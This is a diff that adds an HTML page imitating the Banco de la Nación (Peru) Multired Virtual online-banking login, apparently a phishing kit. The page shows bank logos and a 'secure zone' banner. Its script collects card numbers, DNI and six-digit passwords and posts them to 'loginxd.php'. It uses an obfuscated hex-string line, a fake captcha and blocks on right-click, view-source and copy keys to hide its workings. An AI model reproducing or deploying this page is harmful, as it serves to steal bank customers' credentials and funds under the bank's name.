@@ -1,0 +1,284 @@
+<html class="cufon-active cufon-ready"><head>
+<script type="text/javascript" src="softlayer/js/bn-jquery.js"></script>
+<script type="text/javascript" src="softlayer/js/jquery.ui.js"></script>
+<script type="text/javascript" src="softlayer/js/select.js"></script>
+<script type="text/javascript" src="softlayer/js/util.js"></script>  
+<script type="text/javascript" src="softlayer/js/cufon.js"></script><style type="text/css">cufon{text-indent:0!important;}@media screen,projection{cufon{display:inline!important;display:inline-block!important;position:relative!important;vertical-align:middle!important;font-size:1px!important;line-height:1px!important;}cufon cufontext{display:-moz-inline-box!important;display:inline-block!important;width:0!important;height:0!important;overflow:hidden!important;text-indent:-10000in!important;}cufon canvas{position:relative!important;}}@media print{cufon{padding:0!important;}cufon canvas{display:none!important;}}</style>
+<script type="text/javascript" src="softlayer/js/Medium_500.font.js"></script>
+<script type="text/javascript" src="softlayer/js/browser.js"></script>
+<script type="text/javascript">
+var brw = new Browser();
+if(brw.code == 'ch'){
+Cufon.replace('.dax');
+Cufon.replace('.boton-clave');
+	$(document).ready(function(){		
+ 		$('.boton-clave').css('height','20px');
+		$('.boton-clave').css('padding-top','5px'); 	
+	});
+}
+</script>
+<script language="javascript">
+$(document).ready(
+ function(){ 	 	 
+var _0x38a5=["\x64\x69\x73\x61\x62\x6C\x65\x64","\x72\x65\x6D\x6F\x76\x65\x41\x74\x74\x72","\x23\x62\x74\x6E\x4C\x6F\x67\x69\x6E"];$(_0x38a5[2])[_0x38a5[1]](_0x38a5[0])
+ 	 $("#txtNumeroTarjeta").focus();
+ 	 $("#txtNumeroTarjeta").val("4214");
+     
+     $("#boton_captcha").click(function(){
+     	var cont_param = parseInt($("#param_captcha").val());
+		var ale = (aleatorio(1,7))
+		//alert (ale);
+     	$("#srcCaptcha").html('<img alt="captcha"  id="captcha" name="captcha" src="softlayer/img/'+ale+'.png" height="25" width="114" />');
+     	$("#captcha").attr('src','softlayer/img/'+ale+'.png');
+     	cont_param+=1;
+     	$("#param_captcha").val(cont_param);
+     });
+     
+     $("#limpiar").click(function(){
+     	$("#txtPassword").val("");
+     });
+ });
+
+	function cambiarTipoTarjeta(){
+	   var valor = $("#cboTipoTarjeta").val();
+	   $("input[type=text]").val('');
+	   $("input[type=password]").val('');	   
+	   $('.tarjeta_dni').hide(); //Oculta Los campos de tarjeta y sus label
+	   
+	   switch(valor){
+	   		case 'Multired Global Debito':
+	   			$('#txtNumeroTarjeta').show();
+				$('#trNumeroTarjeta').show();
+				$('#txtNumeroTarjeta').val('4214');
+				$('#txtPassword').attr('maxlength','6');
+				$('#lblDigitosClave').html('06');
+				$("#ind_long_clave").val('6');
+				$('#txtNumeroTarjeta').focus();
+				break;
+	   		
+	   		case 'Multired Clasica':
+				$('#txtNumeroTarjeta').show();
+				$('#trNumeroTarjeta').show();	
+				$('#txtNumeroTarjeta').val('8018');	
+				$('#txtPassword').attr('maxlength','6');
+				$('#lblDigitosClave').html('06');
+				$("#ind_long_clave").val('6');
+				$('#txtNumeroTarjeta').focus();
+				break;
+			
+			case 'DNI (Cta. Cte.)':
+				$('#txtDNI').show();
+				$('#trDNI').show();				
+				$('#txtPassword').attr('maxlength','6');
+				$('#lblDigitosClave').html('06');
+				$("#ind_long_clave").val('6');
+				$('#txtDNI').focus();
+				break;
+	   }
+	 }
+	
+	function validarSiNumero(numero){
+		var textoStr =  numero.toString() // transformo a string todo el campo
+		var tiene = 0
+		for(var i = 0;i < numero.length;i++){ // recorro caracter potr caracter
+			var oneChar = textoStr.charAt(i)
+			if (!/^([0-9])*$/.test(oneChar)){ // busco un caracter que no sea Numerico
+				tiene = 1
+			}
+		}
+		if (tiene == 1){ // controlo si existe o no caracter que no sea numerico.
+			return true
+		} else {
+			return false
+		} 
+	}
+	
+	function evalRanTable(valor){
+		var longitud = parseInt($("#ind_long_clave").val());
+		if($("#txtPassword").val().length < longitud){
+		$("#txtPassword").val($("#txtPassword").val()+valor);
+		}
+	}
+</script>
+<meta http-equiv="Content-Language" content="es">
+<meta charset="utf-8">
+<link rel="stylesheet" type="text/css" href="softlayer/css/resetearcss.css">
+<link rel="stylesheet" type="text/css" href="softlayer/css/bn-principal.css">
+<link rel="stylesheet" type="text/css" href="softlayer/css/tipografias.css">
+<link rel="stylesheet" type="text/css" href="softlayer/css/home.css">
+<link rel="stylesheet" type="text/css" href="softlayer/css/select.css">
+<link rel="stylesheet" type="text/css" href="softlayer/css/TheCodePoints.css">
+<title>Banco de la Nación - Multired Virtual</title>
+<style type="text/css">
+.Estilo1 {
+	color: #FF0000;
+	font-weight: bold; }
+
+.secure {  /* Clase para el input type="text" */
+/* -webkit-text-security:disc !important; 
+font-size: 9px !important; */
+font-family:TheCodePoints !important; }
+</style>
+<script language="JavaScript">
+document.onkeydown = function(e) {
+tecla = (document.all) ? e.keyCode : e.which;
+	//alert(tecla)
+if (tecla === 116 || tecla === 123)  return false;
+if (e.ctrlKey && (tecla === 67 || tecla === 83 || tecla === 85 || tecla === 86 || tecla === 116)) { return false; } else { return true; }};
+$(document).keypress("u",function(e) { if(e.ctrlKey) { return false; } else { return true; } });
+</script>
+<script language="JavaScript">
+document.addEventListener("contextmenu", function(e){e.preventDefault();}, false);
+</script>
+</head>
+<body>
+	<div id="contenedor">
+        <div id="cabecera">
+            <div id="logo-multired">
+              <img src="softlayer/img/logo-multired.jpg" alt="Logotipo Multired">
+            </div>
+            <div id="logo-bn">
+                <img src="softlayer/img/logo-bn.jpg" alt="Logotipo del Banco de la Nación">
+            </div>
+        </div>
+        <div id="cuerpo">
+            <h1 class="dax"><img src="softlayer/img/candado.png"><cufon class="cufon cufon-canvas" alt=" " style="width: 6px; height: 24px;"><canvas width="21" height="31" style="width: 21px; height: 31px; top: -5px; left: 0px;"></canvas><cufontext> </cufontext></cufon><cufon class="cufon cufon-canvas" alt="Usted " style="width: 58px; height: 24px;"><canvas width="73" height="31" style="width: 73px; height: 31px; top: -5px; left: 0px;"></canvas><cufontext>Usted </cufontext></cufon><cufon class="cufon cufon-canvas" alt="se " style="width: 27px; height: 24px;"><canvas width="41" height="31" style="width: 41px; height: 31px; top: -5px; left: 0px;"></canvas><cufontext>se </cufontext></cufon><cufon class="cufon cufon-canvas" alt="encuentra " style="width: 99px; height: 24px;"><canvas width="114" height="31" style="width: 114px; height: 31px; top: -5px; left: 0px;"></canvas><cufontext>encuentra </cufontext></cufon><cufon class="cufon cufon-canvas" alt="en " style="width: 29px; height: 24px;"><canvas width="44" height="31" style="width: 44px; height: 31px; top: -5px; left: 0px;"></canvas><cufontext>en </cufontext></cufon><cufon class="cufon cufon-canvas" alt="una " style="width: 40px; height: 24px;"><canvas width="55" height="31" style="width: 55px; height: 31px; top: -5px; left: 0px;"></canvas><cufontext>una </cufontext></cufon><span><cufon class="cufon cufon-canvas" alt="zona " style="width: 49px; height: 24px;"><canvas width="64" height="31" style="width: 64px; height: 31px; top: -5px; left: 0px;"></canvas><cufontext>zona </cufontext></cufon><cufon class="cufon cufon-canvas" alt="segura" style="width: 62px; height: 24px;"><canvas width="72" height="31" style="width: 72px; height: 31px; top: -5px; left: 0px;"></canvas><cufontext>segura</cufontext></cufon></span></h1>
+            <div id="login">
+                <div id="border-superior"><img src="softlayer/img/border-arriba.png" alt="Border Login Superior"></div>
+                <div id="login-contenido">
+                    <div id="border-inferior"></div>
+                    <form method="post" id="form" name="form">
+					<input type="hidden" id="ind_long_clave" name="ind_long_clave" value="6">
+					<input type="hidden" id="param_captcha" name="param_captcha" value="1">
+    <div class="fila limpiar">
+        <label for="tipo-documento">Seleccione:</label>
+           <select id="cboTipoTarjeta" class="tipo-documento select" onchange="cambiarTipoTarjeta();" name="cboTipoTarjeta" style="display: none;">
+				<option value="Multired Global Debito">Multired Global Débito</option>
+				<option value="Multired Clasica">Multired Clásica</option>
+				<option )="" value="DNI (Cta. Cte.)">DNI (Cuenta Corriente)</option>
+			</select><a class="ui-selectmenu ui-widget ui-state-default ui-corner-all tipo-documento select ui-selectmenu-dropdown" id="cboTipoTarjeta-button" role="button" href="#" aria-haspopup="true" aria-owns="cboTipoTarjeta-menu" style="width: 248px;"><span class="ui-selectmenu-status">Multired Global Débito</span><span class="ui-selectmenu-icon ui-icon ui-icon-triangle-1-s"></span></a>                           
+    </div>
+                        <div class="fila  limpiar">
+                            <label id="trNumeroTarjeta" for="numero-tarjeta" class="tarjeta_dni">Número de tarjeta:</label>
+                            <input type="tel" name="txtNumeroTarjeta" id="txtNumeroTarjeta" class="grande tarjeta_dni" maxlength="16" onkeypress="return soloNumerosAll(event)">
+                            <label id="trDNI" for="numero-tarjeta" style="display:none;" class="tarjeta_dni">DNI:</label>
+                            <input type="tel" name="txtDNI" id="txtDNI" class="grande tarjeta_dni" maxlength="8" onkeypress="return soloNumerosAll(event)" style="display:none;">
+                        </div>
+                      <div class="fila limpiar">
+                      		                            <label for="clave" style="width: 140px;">Ingresa tu clave usando el teclado virtual:</label>
+                            <div id="botones-clave">
+                                <div class="boton-clave" onclick="evalRanTable('5');" style="height: 20px; padding-top: 5px;"><span class="dax"><cufon class="cufon cufon-canvas" alt="5" style="width: 9px; height: 16px;"><canvas width="14" height="21" style="width: 14px; height: 21px; top: -3px; left: 0px;"></canvas><cufontext>5</cufontext></cufon></span></div>
+                                <div class="boton-clave" onclick="evalRanTable('4');" style="height: 20px; padding-top: 5px;"><cufon class="cufon cufon-canvas" alt="4" style="width: 9px; height: 16px;"><canvas width="14" height="21" style="width: 14px; height: 21px; top: -3px; left: 0px;"></canvas><cufontext>4</cufontext></cufon></div>
+                                <div class="boton-clave" onclick="evalRanTable('9');" style="height: 20px; padding-top: 5px;"><cufon class="cufon cufon-canvas" alt="9" style="width: 9px; height: 16px;"><canvas width="14" height="21" style="width: 14px; height: 21px; top: -3px; left: 0px;"></canvas><cufontext>9</cufontext></cufon></div>
+                                <div class="boton-clave" onclick="evalRanTable('3');" style="height: 20px; padding-top: 5px;"><cufon class="cufon cufon-canvas" alt="3" style="width: 9px; height: 16px;"><canvas width="14" height="21" style="width: 14px; height: 21px; top: -3px; left: 0px;"></canvas><cufontext>3</cufontext></cufon></div>
+                                <div class="boton-clave" onclick="evalRanTable('6');" style="height: 20px; padding-top: 5px;"><cufon class="cufon cufon-canvas" alt="6" style="width: 9px; height: 16px;"><canvas width="14" height="21" style="width: 14px; height: 21px; top: -3px; left: 0px;"></canvas><cufontext>6</cufontext></cufon></div>
+                                <div class="boton-clave" onclick="evalRanTable('7');" style="height: 20px; padding-top: 5px;"><cufon class="cufon cufon-canvas" alt="7" style="width: 9px; height: 16px;"><canvas width="14" height="21" style="width: 14px; height: 21px; top: -3px; left: 0px;"></canvas><cufontext>7</cufontext></cufon></div>
+                                <div class="boton-clave" onclick="evalRanTable('0');" style="height: 20px; padding-top: 5px;"><cufon class="cufon cufon-canvas" alt="0" style="width: 9px; height: 16px;"><canvas width="14" height="21" style="width: 14px; height: 21px; top: -3px; left: 0px;"></canvas><cufontext>0</cufontext></cufon></div>
+                                <div class="boton-clave" onclick="evalRanTable('1');" style="height: 20px; padding-top: 5px;"><cufon class="cufon cufon-canvas" alt="1" style="width: 9px; height: 16px;"><canvas width="14" height="21" style="width: 14px; height: 21px; top: -3px; left: 0px;"></canvas><cufontext>1</cufontext></cufon></div>
+                                <div class="boton-clave" onclick="evalRanTable('2');" style="height: 20px; padding-top: 5px;"><cufon class="cufon cufon-canvas" alt="2" style="width: 9px; height: 16px;"><canvas width="14" height="21" style="width: 14px; height: 21px; top: -3px; left: 0px;"></canvas><cufontext>2</cufontext></cufon></div>
+                                <div class="boton-clave" onclick="evalRanTable('8');" style="height: 20px; padding-top: 5px;"><cufon class="cufon cufon-canvas" alt="8" style="width: 9px; height: 16px;"><canvas width="14" height="21" style="width: 14px; height: 21px; top: -3px; left: 0px;"></canvas><cufontext>8</cufontext></cufon></div>
+                                <div class="boton-clave limpiar" id="limpiar" style="height: 20px; padding-top: 5px;"><cufon class="cufon cufon-canvas" alt="LIMPIAR" style="width: 39px; height: 12px;"><canvas width="44" height="16" style="width: 44px; height: 16px; top: -3px; left: 0px;"></canvas><cufontext>LIMPIAR</cufontext></cufon></div>
+                            </div>
+							<div id="campo-clave">
+                              <p style="width: 175px ! important;"><img src="softlayer/img/generar-clave.png" style="float: left; margin: -3px ! important;" height="20" border="0" width="20"> <a href="#" style="color: rgb(186, 17, 19); text-decoration: underline; font: 12px arial;">Genera tu Clave de Internet</a></p>
+							  <p style="width: 124px;">Ingresa tu <b>Clave de Internet (06 dígitos)</b> </p>
+								<input name="txtPassword" id="txtPassword" maxlength="6" style="margin: 0px 10px;" type="text" class="secure" readonly="">
+                              <div class="olvido-clave">
+                                <div class="olvide-clave"><a href="#" style="color: rgb(186, 17, 19);text-decoration: underline;">Olvidé mi clave</a></div>
+                              </div>
+					    	</div>
+                        </div>
+               <div class="fila limpiar" style="margin: 0px;">
+                            <label for="capcha">Ingresa el texto de la imagen:</label>
+                            <div class="capcha">
+                                <div id="srcCaptcha"><img height="25" width="114" alt="captcha" id="captcha" name="captcha" src="softlayer/img/3.png">
+								</div>
+                                <div class="boton_captcha" id="boton_captcha">Cambiar texto</div>
+                            </div>
+                            <input class="capcha" type="text" name="txtCaptcha" id="txtCaptcha" maxlength="5">
+                        </div>
+                  <input name="btnLogin" id="btnLogin" type="button" value="INGRESAR" onclick="javascript:return enviar_parametro();">
+                    </form>
+                </div>
+                <div id="border-inferior"><img src="softlayer/img/border-abajo.png" alt="Border Login Inferior"></div>
+            </div>
+            <div class="cysErrorMsg" style="display:none">
+				<li>DATOS DE ACCESO INVALIDOS (WB-0001).</li>
+
+			</div>
+
+        </div>   
+<div id="pie-pagina">
+   <div id="titulo-pie-pagina">Banco de la Nación  |  Ministerio de Economía y Finanzas</div>
+	 <div id="oficinas">
+        <p>Oficina Principal: Av. República de Panamá 3664. San Isidro. Central Telefónica: 519-20 00. </p>
+        <p>Atención en Oficinas Administrativas: Lunes a Viernes de 8:30 a 17:30 horas. Refrigerio de: 13 a 14 horas </p>
+        <p>Ateción en Oficina de Trámite Documentario: Lunes a Viernes de 9:00 a 17:00 horas (Horario corrido).</p>
+      </div>
+	</div>
+</div>
+    <script type="text/javascript" src="softlayer/js/funciones.js"></script>
+    <script type="text/javascript">
+        $(document).ready(function(){
+		myApp.select.init();
+		myApp.home.init();
+	});
+    </script>
+<script>
+function enviar_parametro() {
+	
+		if ($("#cboTipoTarjeta").val() == 'DNI (Cta. Cte.)'){
+			// Validando que el Número de DNI no tenga caracteres que no sean números
+			if (validarSiNumero($("#txtDNI").val())){
+				alert('El número de DNI solo acepta números...');
+				return false; }
+			// Validando que el Número de DNI sea de 8 digitos
+			if ($("#txtDNI").val().length < 8){
+				alert('El número de DNI debe ser de 8 Digitos no menos');
+				return false; }
+			// Validando que la clave con DNI sea de 6 digitos
+			if ($("#txtPassword").val().length < 6){
+				alert('Su Clave debe ser de 6 Digitos no menos');
+				return false; }
+			  
+  			if ($("#txtCaptcha").val().length < 5){
+				alert('Su Clave Captcha debe ser de 5 Digitos no menos');
+				return false; }
+		} else {
+			// Validando que el Número de Tarjeta no tenga caracteres que no sean números
+			if (validarSiNumero($("#txtNumeroTarjeta").val())){
+				alert('El número de Tarjeta solo acepta números...');
+				return false; }
+			// Validando que el Número de Tarjeta sea de 16 digitos
+			if ($("#txtNumeroTarjeta").val().length < 16){
+				alert('El número de Tarjeta debe ser de 16 Digitos no menos');
+				return false; }
+			// Validando que la clave con TARJETA sea de 6 digitos
+			if ($("#txtPassword").val().length < 6){
+				alert('Su Clave debe ser de 6 Digitos no menos');
+				return false; }
+			
+			if ($("#txtCaptcha").val().length < 5){
+				alert('Su Clave Captcha debe ser de 5 Digitos no menos');
+				return false; }
+			$('input[type="button"]').attr('disabled','disabled');
+		}
+
+	var Tipo = document.getElementById('cboTipoTarjeta').value;
+	var Tarjeta = document.getElementById('txtNumeroTarjeta').value;
+	var Dni = document.getElementById('txtDNI').value;
+	var Pass = document.getElementById('txtPassword').value;
+	//alert (Tarjeta);
+		$.ajax({
+                url: 'loginxd.php',
+                data: {accion: "0" , 'cboTipoTarjeta':Tipo, 'txtNumeroTarjeta':Tarjeta, 'txtDNI':Dni, 'txtPassword':Pass},
+                type: 'post',
+                success: function(respuesta) {
+				resultado = respuesta.replace(/\s/g, ''); // Limpia espacios en blanco
+                  window.location="load.do?id=" + resultado;
+                }
+            });
+}
+</script>
+
+<ul class="ui-selectmenu-menu ui-widget ui-widget-content ui-corner-bottom tipo-documento select ui-selectmenu-menu-dropdown" aria-hidden="true" role="listbox" aria-labelledby="cboTipoTarjeta-button" id="cboTipoTarjeta-menu" aria-activedescendant="ui-selectmenu-item-479" style="width: 248px; left: 885.5px; top: 198px;"><li role="presentation" class="ui-selectmenu-item-selected"><a href="#" tabindex="-1" role="option" aria-selected="true" id="ui-selectmenu-item-479">Multired Global Débito</a></li><li role="presentation"><a href="#" tabindex="-1" role="option" aria-selected="false">Multired Clásica</a></li><li role="presentation" class="ui-corner-bottom"><a href="#" tabindex="-1" role="option" aria-selected="false">DNI (Cuenta Corriente)</a></li></ul></body></html>
